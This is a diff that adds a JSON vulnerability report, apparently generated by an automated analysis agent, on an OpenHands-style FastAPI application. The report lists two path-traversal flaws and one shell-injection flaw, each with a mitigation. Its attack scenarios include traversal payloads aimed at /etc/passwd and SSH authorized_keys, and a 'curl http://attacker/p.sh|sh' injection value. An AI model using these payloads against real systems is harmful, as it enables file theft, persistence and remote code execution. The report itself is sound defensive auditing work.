@@ -1,0 +1,146 @@
+{
+  "json_path": "/srv/home/shiqiu/AgentXploit/src/analysis_agent/reports/analysis_5987_20260121_211006.json",
+  "created_at": "2026-01-21 21:10:08",
+  "last_updated": "2026-01-21 21:15:25",
+  "status": "completed",
+  "environment": {
+    "framework": "Python 3.12 application with FastAPI/Uvicorn backend plus supporting CLI and frontend packages",
+    "docker_required": false,
+    "entry_points": [
+      "openhands/cli/main.py",
+      "docker-compose.yml",
+      "frontend package scripts"
+    ],
+    "config_files": [
+      "config.toml",
+      "config.template.toml",
+      "docker-compose.yml",
+      "pyproject.toml",
+      "poetry.lock"
+    ]
+  },
+  "dependencies": [
+    "fastapi",
+    "uvicorn",
+    "aiohttp",
+    "docker",
+    "numpy",
+    "jinja2",
+    "python-multipart",
+    "psutil",
+    "redis",
+    "minio",
+    "stripe",
+    "kubernetes",
+    "pyyaml",
+    "boto3",
+    "fastmcp",
+    "prompt-toolkit",
+    "pygithub",
+    "python-dotenv",
+    "libtmux"
+  ],
+  "tools": [],
+  "traditional_vulnerabilities": {
+    "scan_type": "traditional",
+    "vulnerabilities": [
+      {
+        "type": "path_traversal",
+        "severity": "high",
+        "title": "Conversation file selection endpoint allows arbitrary filesystem read via path traversal",
+        "description": "The `/api/conversations/{conversation_id}/select-file` endpoint joins the user-supplied `file` query parameter directly with the runtime workspace path and forwards it to the runtime for reading without any normalization or root containment checks. Because the runtime later resolves the path using `Path(base) / Path(file)` and passes it to `open()`, an attacker can include `../` segments to escape the workspace and read any file that the runtime process can access.",
+        "file_path": "/openhands/server/routes/files.py",
+        "line_numbers": [
+          148,
+          175
+        ],
+        "code_snippet": "    file = os.path.join(runtime.config.workspace_mount_path_in_sandbox, file)\n    read_action = FileReadAction(file)\n    try:\n        observation = await call_sync_from_async(runtime.run_action, read_action)\n    except AgentRuntimeUnavailableError as e:\n        ...",
+        "attack_scenario": "A malicious tenant who has an authenticated conversation calls `GET /api/conversations/<id>/select-file?file=../../../../etc/passwd`. The handler joins the untrusted value with the workspace path and the runtime resolves `/workspace/<conversation>/../../../../etc/passwd`, ultimately returning the contents of `/etc/passwd` in the JSON response.",
+        "impact": "Any authenticated user can exfiltrate arbitrary files from the host/container filesystem, including application secrets and SSH keys, which can lead to full system compromise.",
+        "evidence": "`openhands/runtime/action_execution_server.py` shows `_resolve_path()` simply concatenates the working directory and user path (lines 455-517) and then calls `open()` on the resulting string without sanitizing `..`, so the FastAPI route effectively exposes arbitrary files once the attacker supplies a traversal payload.",
+        "cwe_id": "CWE-22",
+        "mitigation": "Normalize and validate requested paths before use. Use `Path.resolve()` and ensure the resolved path starts with the allowed workspace root, rejecting any request that escapes that root. Alternatively, forbid `..` segments or use a dedicated virtual file system abstraction that enforces confinement."
+      },
+      {
+        "type": "path_traversal",
+        "severity": "high",
+        "title": "File upload endpoint allows arbitrary file overwrite outside workspace",
+        "description": "The `/api/conversations/{conversation_id}/upload-files` endpoint writes uploaded files to `os.path.join(runtime.config.workspace_mount_path_in_sandbox, file.filename)` without sanitizing the provided filename. Because filenames from multipart uploads can contain path separators, an attacker can traverse out of the workspace and create or overwrite arbitrary files on the server.",
+        "file_path": "/openhands/server/routes/files.py",
+        "line_numbers": [
+          309,
+          336
+        ],
+        "code_snippet": "        file_path = os.path.join(\n            runtime.config.workspace_mount_path_in_sandbox, str(file.filename)\n        )\n        ...\n            write_action = FileWriteAction(\n                path=file_path,\n                content=file_content.decode('utf-8', errors='replace'),\n            )\n            await call_sync_from_async(runtime.run_action, write_action)\n            uploaded_files.append(file_path)",
+        "attack_scenario": "An attacker crafts a multipart upload with the filename set to `../../../../home/openhands/.ssh/authorized_keys` and uploads their public key. The server resolves the path outside the workspace and overwrites the SSH authorized_keys file, granting the attacker shell access on the host container.",
+        "impact": "Arbitrary file creation or overwrite allows privilege escalation, persistence, and remote code execution by dropping scripts, modifying configuration, or placing SSH keys.",
+        "evidence": "`FileWriteAction` ultimately calls `_resolve_path()` in `openhands/runtime/action_execution_server.py`, which simply concatenates the working directory and user-provided path before opening the file (lines 530-578), so injected `../` segments are honored by the filesystem.",
+        "cwe_id": "CWE-73",
+        "mitigation": "Sanitize uploaded filenames by stripping path separators, or better yet, generate server-side names. Resolve the resulting path and ensure it stays within the workspace root before writing. Reject any filename containing `../`, absolute paths, or null bytes."
+      },
+      {
+        "type": "command_injection",
+        "severity": "critical",
+        "title": "Shell command injection in runtime initialization via unescaped working directory/username",
+        "description": "`init_user_and_working_directory()` composes multiple shell command strings with untrusted `initial_cwd`, `username`, and `user_id` values and executes them with `subprocess.run(..., shell=True)`. Because these values ultimately come from the runtime configuration/CLI arguments (e.g., `--working-dir` on `action_execution_server.py`, which can be influenced by tenant input), an attacker can inject shell metacharacters to execute arbitrary commands as the runtime user (often root inside the container) when the server starts.",
+        "file_path": "/openhands/runtime/utils/runtime_init.py",
+        "line_numbers": [
+          52,
+          118
+        ],
+        "code_snippet": "    command = f'umask 002; mkdir -p {initial_cwd}'\n    output = subprocess.run(command, shell=True, capture_output=True)\n    ...\n    command = f'chown -R {username}:root {initial_cwd}'\n    output = subprocess.run(command, shell=True, capture_output=True)\n    ...\n    command = (\n        f'useradd -rm -d /home/{username} -s /bin/bash '\n        f'-g root -G sudo -u {user_id} {username}'\n    )\n    output = subprocess.run(command, shell=True, capture_output=True)",
+        "attack_scenario": "A malicious tenant provides a workspace path like `workspace;curl http://attacker/p.sh|sh #` via configuration input that feeds into `--working-dir`. When the action execution server calls `init_user_and_working_directory`, the injected `;curl ...` sequence executes with root privileges, giving the attacker arbitrary command execution on the host/container before any sandboxing is applied.",
+        "impact": "Arbitrary command execution as the runtime user (typically root) completely compromises the container, allowing the attacker to install backdoors, read/write sensitive data, or pivot to other services.",
+        "evidence": "All of the commands (`mkdir -p`, `chown`, `chmod`, `useradd`) are built via f-strings with user-controlled values and executed with `shell=True` without quoting or validation, providing a classic shell-injection vector.",
+        "cwe_id": "CWE-78",
+        "mitigation": "Never pass untrusted values to a shell. Replace these `subprocess.run(..., shell=True)` calls with argument lists (shell=False) and validate that `initial_cwd` and `username` contain only expected characters (e.g., use `shlex.quote` or regex). When running privileged setup logic, ensure configuration inputs are trusted or hard-code the working directory instead of accepting tenant-controlled values."
+      }
+    ],
+    "summary": {
+      "total_vulnerabilities": 3,
+      "by_severity": {
+        "critical": 1,
+        "high": 2,
+        "medium": 0,
+        "low": 0
+      },
+      "by_type": {
+        "path_traversal": 2,
+        "command_injection": 1
+      },
+      "files_affected": [
+        "/openhands/server/routes/files.py",
+        "/openhands/runtime/utils/runtime_init.py"
+      ]
+    },
+    "overall_risk": "critical",
+    "recommendations": [
+      "Normalize and constrain all file system paths to the intended workspace root before performing reads or writes.",
+      "Avoid executing shell commands constructed from untrusted input; prefer subprocess argument lists and strict input validation.",
+      "Implement rigorous server-side validation for filenames and query parameters exposed via FastAPI routes."
+    ]
+  },
+  "final_summary": {
+    "tools_analyzed": 0,
+    "tools_with_vulnerabilities": 0,
+    "tool_vulnerability_counts": {
+      "critical": 0,
+      "high": 0,
+      "medium": 0,
+      "low": 0
+    },
+    "traditional_vulnerability_counts": {
+      "critical": 1,
+      "high": 2,
+      "medium": 0,
+      "low": 0
+    },
+    "total_vulnerability_counts": {
+      "critical": 1,
+      "high": 2,
+      "medium": 0,
+      "low": 0
+    },
+    "overall_risk": "critical"
+  }
+}
